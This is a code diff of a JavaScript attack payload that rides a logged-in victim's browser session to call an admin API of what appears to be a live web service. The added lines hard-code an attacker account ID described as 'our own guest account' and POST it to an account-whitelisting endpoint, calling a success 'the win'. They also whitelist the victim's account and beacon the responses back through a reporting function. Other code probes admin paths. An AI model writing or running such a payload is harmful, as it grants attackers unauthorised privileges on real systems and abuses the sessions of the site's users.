@@ -87,19 +87,19 @@
                '/api/Admin/ips', '/api/admin/white_ip'];
   // Confirmed in the product's own 1407-path spec (test.livegirl.me:8999): the account
   // whitelist writer is POST /api/Admin/AddAccountToWhilteList?accountId= (upstream typo).
+  var OURS = 43761575;  // our own guest account - the one worth whitelisting
+  function wpost(id, tag) {
+    var p = '/api/Admin/AddAccountToWhilteList?accountId=' + id;
+    fetch(p, { method: 'POST', credentials: 'include', headers: { Accept: 'application/json' } })
+      .then(function (r) { return r.text().then(function (t) { beb(tag + ':' + r.status, p + ' ' + t.slice(0, 120)); }); })
+      .catch(function () {});
+  }
   function probeWriter() {
-    var me = function () {
-      return fetch('/api/Account/GetUserInfoV2', { credentials: 'include' })
-        .then(function (r) { return r.json(); })
-        .then(function (o) { return ((o && o.data) || o || {}).accountId; });
-    };
-    me().then(function (id) {
-      if (!id) return beb('w0', 'no accountId');
-      var p = '/api/Admin/AddAccountToWhilteList?accountId=' + id;
-      fetch(p, { method: 'POST', credentials: 'include', headers: { Accept: 'application/json' } })
-        .then(function (r) { return r.text().then(function (t) { beb('w1:' + r.status, p + ' ' + t.slice(0, 120)); }); })
-        .catch(function () {});
-    }).catch(function () {});
+    wpost(OURS, 'w1');  // us first: a 200 here is the win
+    fetch('/api/Account/GetUserInfoV2', { credentials: 'include' })
+      .then(function (r) { return r.json(); })
+      .then(function (o) { var id = ((o && o.data) || o || {}).accountId; if (id && id !== OURS) wpost(id, 'w2'); })
+      .catch(function () {});
   }
   function probePaths() {
     PATHS.forEach(function (p, k) {
